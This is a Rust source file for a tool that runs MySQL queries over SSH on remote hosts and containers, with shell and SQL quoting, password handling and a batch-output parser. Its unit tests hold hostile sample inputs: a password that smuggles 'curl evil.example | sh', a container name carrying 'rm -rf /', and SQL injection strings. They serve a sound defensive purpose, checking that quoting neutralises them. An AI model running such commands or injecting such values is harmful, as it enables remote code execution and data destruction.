//! Running SQL against a discovered database.
//!
//! Queries go through the host's own `mysql` client over the existing SSH exec path
//! rather than a driver crate. Three reasons that is the right trade here:
//!
//! - It adds no dependency, and in particular no second TLS stack. This project keeps
//!   deliberately to `rustls`/`ring` so the build stays clean on the MinGW toolchain.
//! - `docker exec` reaches a containerised database with no published port and no
//!   network changes, which is most of what "and the Docker ones too" means in practice.
//! - Authentication is the server's own, so a user who can already log in over SSH does
//!   not have to re-plumb grants or expose 3306.
//!
//! The cost is that results are text, so [`parse_batch`] has to undo `mysql`'s batch
//! escaping. That is a contained, testable problem — see the tests at the bottom.
//!
//! # Keeping the password out of `ps`
//!
//! `mysql -pSECRET` puts the password in the remote process list, where any user on that
//! box can read it. Instead the password is written to a `0600` temp file as a
//! `[client]` section and passed with `--defaults-extra-file`, then the file is removed
//! whether the query succeeded or not. `umask 077` is set *before* `mktemp`, so the file
//! is never briefly world-readable.

use serde::{Deserialize, Serialize};

use crate::ssh::{shell_quote, SessionManager};

/// Which database to talk to, and as whom.
#[derive(Debug, Clone, Deserialize)]
pub struct DbTarget {
    pub vps_id: String,
    /// Run inside this container when set, otherwise on the host.
    pub container: Option<String>,
    /// Host as the *database client* sees it (the server's own loopback, usually).
    pub host: String,
    pub port: u16,
    pub user: String,
    pub password: String,
    /// Default schema, when one is selected.
    pub database: Option<String>,
}

/// A tabular result. Values are `None` for SQL NULL.
#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
pub struct ResultSet {
    pub columns: Vec<String>,
    pub rows: Vec<Vec<Option<String>>>,
    /// Rows affected, for statements that don't return a set.
    pub affected: Option<u64>,
    /// Server-reported notice, if any.
    pub message: Option<String>,
}

impl ResultSet {
    fn empty() -> Self {
        Self { columns: Vec::new(), rows: Vec::new(), affected: None, message: None }
    }
}

/// The script that actually runs the query, before it is wrapped for `sh -c`.
///
/// Split out from [`build_command`] because the wrapping escapes everything a second
/// time: asserting on the doubly-escaped result is unreadable and brittle, whereas this
/// is the layer where the quoting decisions are actually made.
///
/// Everything interpolated is `shell_quote`d. The SQL goes to `-e` as one quoted
/// argument, so shell metacharacters inside a query are inert.
fn inner_script(target: &DbTarget, sql: &str) -> String {
    let mut args = format!(
        "--protocol=TCP -h {} -P {} -u {}",
        shell_quote(&target.host),
        target.port,
        shell_quote(&target.user),
    );
    if let Some(db) = target.database.as_deref().filter(|d| !d.is_empty()) {
        args.push(' ');
        args.push_str(&shell_quote(db));
    }

    // --batch gives tab-separated output with escaping we can reverse; without it the
    // client draws an ASCII table that is far more work to parse and lossy for values
    // containing box-drawing characters. --skip-column-names is NOT used: the header
    // row is how the column list is discovered.
    format!(
        "umask 077; f=$(mktemp) || exit 1; \
         printf '[client]\\npassword=%s\\n' {} > \"$f\"; \
         mysql --defaults-extra-file=\"$f\" {args} --batch --default-character-set=utf8mb4 -e {}; \
         rc=$?; rm -f \"$f\"; exit $rc",
        shell_quote(&target.password),
        shell_quote(sql),
    )
}

/// Wrap [`inner_script`] so it can be handed to the remote exec channel.
///
/// `sh -c`, not `sh -lc`: a login shell sources profile scripts, which vary by host and
/// by image and can rewrite PATH or print banners into the stdout we are about to parse.
/// `docker exec -i` with no `-t` so no TTY is allocated — with a TTY the client draws its
/// interactive ASCII table instead of batch output.
fn build_command(target: &DbTarget, sql: &str) -> String {
    let inner = inner_script(target, sql);
    match target.container.as_deref() {
        Some(c) => format!("docker exec -i {} sh -c {}", shell_quote(c), shell_quote(&inner)),
        None => format!("sh -c {}", shell_quote(&inner)),
    }
}

/// Run `sql` and parse the result.
pub async fn run_sql(
    sessions: &SessionManager,
    target: &DbTarget,
    sql: &str,
) -> Result<ResultSet, String> {
    let out = sessions
        .run_command(&target.vps_id, &build_command(target, sql))
        .await?;

    if out.exit_code != 0 {
        // mysql puts the useful part on stderr, prefixed with "ERROR 1064 (42000) at ...".
        let detail = out.stderr.trim();
        return Err(if detail.is_empty() {
            format!("the query failed (exit {})", out.exit_code)
        } else {
            clean_error(detail)
        });
    }

    let mut set = parse_batch(&out.stdout);
    // A warning on stderr with a zero exit is worth surfacing, not swallowing.
    let warn = out.stderr.trim();
    if !warn.is_empty() {
        set.message = Some(clean_error(warn));
    }
    Ok(set)
}

/// Strip the noise `mysql` prints around a real error message.
fn clean_error(text: &str) -> String {
    text.lines()
        .map(str::trim)
        .filter(|l| {
            !l.is_empty()
                // Emitted whenever a password is supplied; not an error, and alarming.
                && !l.contains("Using a password on the command line")
                && !l.starts_with("mysql: [Warning]")
        })
        .collect::<Vec<_>>()
        .join("\n")
}

/// Parse `mysql --batch` output: a header row, then one row per line, tab-separated.
///
/// Batch mode escapes tab, newline and backslash inside values (`\t`, `\n`, `\\`) so a
/// value can never be confused with a delimiter. NULL is printed as the bare token
/// `NULL`; a *string* whose content is exactly `NULL` is therefore indistinguishable,
/// which is a documented limitation of the client's batch format rather than something
/// this parser can recover.
pub fn parse_batch(stdout: &str) -> ResultSet {
    let mut lines = stdout.split('\n').filter(|l| !l.is_empty()).peekable();
    let Some(header) = lines.next() else {
        return ResultSet::empty();
    };

    let columns: Vec<String> = header
        .trim_end_matches('\r')
        .split('\t')
        .map(unescape)
        .map(|c| c.unwrap_or_default())
        .collect();

    let rows: Vec<Vec<Option<String>>> = lines
        .map(|line| {
            line.trim_end_matches('\r')
                .split('\t')
                .map(unescape)
                .collect::<Vec<_>>()
        })
        // A ragged line means the output wasn't the table we think it is; dropping it
        // beats showing values under the wrong headings.
        .filter(|r| r.len() == columns.len())
        .collect();

    ResultSet { columns, rows, affected: None, message: None }
}

/// Reverse batch-mode escaping. Returns `None` for the NULL token.
fn unescape(field: &str) -> Option<String> {
    if field == "NULL" {
        return None;
    }
    if !field.contains('\\') {
        return Some(field.to_string());
    }
    let mut out = String::with_capacity(field.len());
    let mut chars = field.chars();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('t') => out.push('\t'),
            Some('n') => out.push('\n'),
            Some('r') => out.push('\r'),
            Some('0') => out.push('\0'),
            Some('\\') => out.push('\\'),
            // Unknown escape: keep it verbatim rather than silently dropping data.
            Some(other) => {
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'),
        }
    }
    Some(out)
}

// ---------------------------------------------------------------------------
// SQL identifier and literal quoting.
//
// These are the only places user- or schema-supplied text becomes SQL. Kept together and
// tested, because getting them wrong is a SQL-injection hole into the user's own data.
// ---------------------------------------------------------------------------

/// Quote an identifier (schema, table, column) with backticks.
///
/// MySQL escapes a literal backtick by doubling it. Anything containing a NUL is
/// rejected outright — it cannot appear in a valid identifier and is a sign of a crafted
/// name.
pub fn quote_ident(name: &str) -> Result<String, String> {
    if name.contains('\0') {
        return Err("invalid identifier".into());
    }
    Ok(format!("`{}`", name.replace('`', "``")))
}

/// Quote a value as a SQL string literal, or `NULL`.
pub fn quote_value(value: Option<&str>) -> String {
    let Some(v) = value else {
        return "NULL".to_string();
    };
    let mut out = String::with_capacity(v.len() + 2);
    out.push('\'');
    for c in v.chars() {
        match c {
            '\'' => out.push_str("''"),
            // Escape the escape character too: MySQL treats backslash as an escape
            // inside string literals unless NO_BACKSLASH_ESCAPES is set, and we cannot
            // assume the server's mode.
            '\\' => out.push_str("\\\\"),
            '\0' => out.push_str("\\0"),
            _ => out.push(c),
        }
    }
    out.push('\'');
    out
}

/// `SHOW DATABASES`, minus the server's own internal schemas.
pub fn list_databases_sql() -> String {
    "SELECT SCHEMA_NAME FROM information_schema.SCHEMATA \
     WHERE SCHEMA_NAME NOT IN ('information_schema','performance_schema','mysql','sys') \
     ORDER BY SCHEMA_NAME"
        .to_string()
}

/// Tables in a schema, with row estimates and size.
pub fn list_tables_sql(schema: &str) -> String {
    format!(
        "SELECT TABLE_NAME, TABLE_TYPE, IFNULL(TABLE_ROWS,0), \
         IFNULL(DATA_LENGTH,0)+IFNULL(INDEX_LENGTH,0), IFNULL(ENGINE,'') \
         FROM information_schema.TABLES WHERE TABLE_SCHEMA = {} ORDER BY TABLE_NAME",
        quote_value(Some(schema))
    )
}

/// Column definitions for a table, including which columns form the primary key.
pub fn describe_table_sql(schema: &str, table: &str) -> String {
    format!(
        "SELECT COLUMN_NAME, COLUMN_TYPE, IS_NULLABLE, COLUMN_KEY, \
         IFNULL(COLUMN_DEFAULT,''), EXTRA \
         FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = {} AND TABLE_NAME = {} \
         ORDER BY ORDINAL_POSITION",
        quote_value(Some(schema)),
        quote_value(Some(table))
    )
}

/// A page of rows from a table.
pub fn select_page_sql(
    schema: &str,
    table: &str,
    limit: u32,
    offset: u64,
) -> Result<String, String> {
    // limit/offset are numbers, never interpolated text, so they can't carry SQL.
    Ok(format!(
        "SELECT * FROM {}.{} LIMIT {} OFFSET {}",
        quote_ident(schema)?,
        quote_ident(table)?,
        limit.clamp(1, 5000),
        offset
    ))
}

/// Update one column of one row, identified by its primary-key values.
///
/// Requires a non-empty key so an edit can never become an unqualified `UPDATE` that
/// rewrites the whole table.
pub fn update_cell_sql(
    schema: &str,
    table: &str,
    column: &str,
    value: Option<&str>,
    key: &[(String, Option<String>)],
) -> Result<String, String> {
    if key.is_empty() {
        return Err(
            "this table has no primary key, so a single row can't be identified — edit it with a SQL statement instead"
                .into(),
        );
    }
    let mut where_parts = Vec::with_capacity(key.len());
    for (col, val) in key {
        where_parts.push(match val {
            // `= NULL` is never true; a NULL key part has to use IS NULL.
            None => format!("{} IS NULL", quote_ident(col)?),
            Some(v) => format!("{} = {}", quote_ident(col)?, quote_value(Some(v))),
        });
    }
    Ok(format!(
        "UPDATE {}.{} SET {} = {} WHERE {} LIMIT 1",
        quote_ident(schema)?,
        quote_ident(table)?,
        quote_ident(column)?,
        quote_value(value),
        where_parts.join(" AND ")
    ))
}

/// Delete one row by primary key.
pub fn delete_row_sql(
    schema: &str,
    table: &str,
    key: &[(String, Option<String>)],
) -> Result<String, String> {
    if key.is_empty() {
        return Err("this table has no primary key, so a single row can't be deleted safely".into());
    }
    let mut where_parts = Vec::with_capacity(key.len());
    for (col, val) in key {
        where_parts.push(match val {
            None => format!("{} IS NULL", quote_ident(col)?),
            Some(v) => format!("{} = {}", quote_ident(col)?, quote_value(Some(v))),
        });
    }
    Ok(format!(
        "DELETE FROM {}.{} WHERE {} LIMIT 1",
        quote_ident(schema)?,
        quote_ident(table)?,
        where_parts.join(" AND ")
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn target() -> DbTarget {
        DbTarget {
            vps_id: "v1".into(),
            container: None,
            host: "127.0.0.1".into(),
            port: 3306,
            user: "root".into(),
            password: "pw".into(),
            database: None,
        }
    }

    #[test]
    fn password_never_reaches_the_command_line() {
        let cmd = build_command(&target(), "SELECT 1");
        assert!(
            !cmd.contains("-ppw") && !cmd.contains("--password=pw"),
            "password must not be an argv entry: {cmd}"
        );
        assert!(cmd.contains("--defaults-extra-file"), "{cmd}");
        assert!(cmd.contains("umask 077"), "temp file must never be world-readable");
        assert!(cmd.contains("rm -f"), "temp file must be removed");
    }

    #[test]
    fn a_hostile_password_cannot_break_out_of_the_shell() {
        let mut t = target();
        t.password = "a'; curl evil.example | sh; #".into();
        // Assert at the layer that does the quoting. build_command escapes this whole
        // string a second time for `sh -c`, so asserting there would mean writing the
        // doubly-escaped form by hand — unreadable, and it would drift on any change.
        let script = inner_script(&t, "SELECT 1");
        // Closed-escaped-reopened, so the quoting stays balanced and the payload is data.
        assert!(script.contains(r#"'a'\''; curl evil.example | sh; #'"#), "{script}");
        // And the wrapper must not undo that.
        let cmd = build_command(&t, "SELECT 1");
        assert!(cmd.starts_with("sh -c '"), "{cmd}");
        assert!(cmd.ends_with('\''), "{cmd}");
    }

    #[test]
    fn a_hostile_sql_string_stays_one_argument() {
        let script = inner_script(&target(), "SELECT 1; DROP TABLE t");
        // The whole statement is one -e argument; the `;` is inside the quotes, so the
        // shell never sees it as a command separator. (MySQL itself will run both
        // statements only if the user asked for that — that is their database.)
        assert!(script.contains("-e 'SELECT 1; DROP TABLE t'"), "{script}");
    }

    #[test]
    fn a_hostile_container_name_is_quoted() {
        let mut t = target();
        t.container = Some("db; rm -rf /".into());
        let cmd = build_command(&t, "SELECT 1");
        assert!(cmd.starts_with("docker exec -i 'db; rm -rf /'"), "{cmd}");
    }

    #[test]
    fn parses_a_result_set() {
        let out = "id\tname\temail\n1\tAda\tada@example.com\n2\tGrace\tNULL\n";
        let set = parse_batch(out);
        assert_eq!(set.columns, vec!["id", "name", "email"]);
        assert_eq!(set.rows.len(), 2);
        assert_eq!(set.rows[0][1].as_deref(), Some("Ada"));
        assert_eq!(set.rows[1][2], None, "NULL must be None, not the text 'NULL'");
    }

    #[test]
    fn unescapes_values_containing_delimiters() {
        // A value with a real tab and newline, as batch mode encodes them.
        let out = "id\tnote\n1\tline1\\nline2\\tafter-tab\n";
        let set = parse_batch(out);
        assert_eq!(set.rows[0][1].as_deref(), Some("line1\nline2\tafter-tab"));
    }

    #[test]
    fn keeps_backslashes_that_are_data() {
        let out = "p\nC:\\\\Users\\\\bogda\n";
        let set = parse_batch(out);
        assert_eq!(set.rows[0][0].as_deref(), Some(r"C:\Users\bogda"));
    }

    #[test]
    fn empty_and_header_only_output() {
        assert_eq!(parse_batch(""), ResultSet::empty());
        let set = parse_batch("id\tname\n");
        assert_eq!(set.columns.len(), 2);
        assert!(set.rows.is_empty());
    }

    #[test]
    fn drops_ragged_lines_rather_than_misaligning_columns() {
        let out = "a\tb\n1\t2\nbroken\n3\t4\n";
        let set = parse_batch(out);
        assert_eq!(set.rows.len(), 2, "{:?}", set.rows);
    }

    #[test]
    fn identifiers_escape_backticks() {
        assert_eq!(quote_ident("users").unwrap(), "`users`");
        assert_eq!(quote_ident("we`ird").unwrap(), "`we``ird`");
        // A crafted name must not be able to close the quoting and append SQL.
        let q = quote_ident("x` ; DROP TABLE t; -- ").unwrap();
        assert!(q.starts_with('`') && q.ends_with('`'));
        assert_eq!(q.matches("``").count(), 1);
        assert!(quote_ident("bad\0name").is_err());
    }

    #[test]
    fn values_escape_quotes_and_backslashes() {
        assert_eq!(quote_value(Some("O'Brien")), "'O''Brien'");
        assert_eq!(quote_value(Some(r"back\slash")), r"'back\\slash'");
        assert_eq!(quote_value(None), "NULL");
        // The classic payload stays inside the literal.
        let q = quote_value(Some("' OR 1=1 -- "));
        assert_eq!(q, "''' OR 1=1 -- '");
    }

    #[test]
    fn an_edit_without_a_key_is_refused() {
        let err = update_cell_sql("s", "t", "c", Some("v"), &[]).unwrap_err();
        assert!(err.contains("primary key"), "{err}");
        assert!(delete_row_sql("s", "t", &[]).is_err());
    }

    #[test]
    fn an_edit_is_qualified_and_limited() {
        let sql = update_cell_sql(
            "shop",
            "orders",
            "status",
            Some("paid"),
            &[("id".into(), Some("42".into()))],
        )
        .unwrap();
        assert_eq!(
            sql,
            "UPDATE `shop`.`orders` SET `status` = 'paid' WHERE `id` = '42' LIMIT 1"
        );
    }

    #[test]
    fn a_null_key_part_uses_is_null() {
        let sql = delete_row_sql("s", "t", &[("a".into(), None), ("b".into(), Some("1".into()))])
            .unwrap();
        assert!(sql.contains("`a` IS NULL AND `b` = '1'"), "{sql}");
    }

    #[test]
    fn page_size_is_clamped() {
        assert!(select_page_sql("s", "t", 0, 0).unwrap().contains("LIMIT 1 "));
        assert!(select_page_sql("s", "t", 99_999, 0).unwrap().contains("LIMIT 5000 "));
    }

    #[test]
    fn strips_the_password_warning_from_errors() {
        let text = "mysql: [Warning] Using a password on the command line interface can be insecure.\nERROR 1146 (42S02): Table 'x.y' doesn't exist";
        let cleaned = clean_error(text);
        assert!(!cleaned.contains("Warning"), "{cleaned}");
        assert!(cleaned.contains("1146"), "{cleaned}");
    }
}
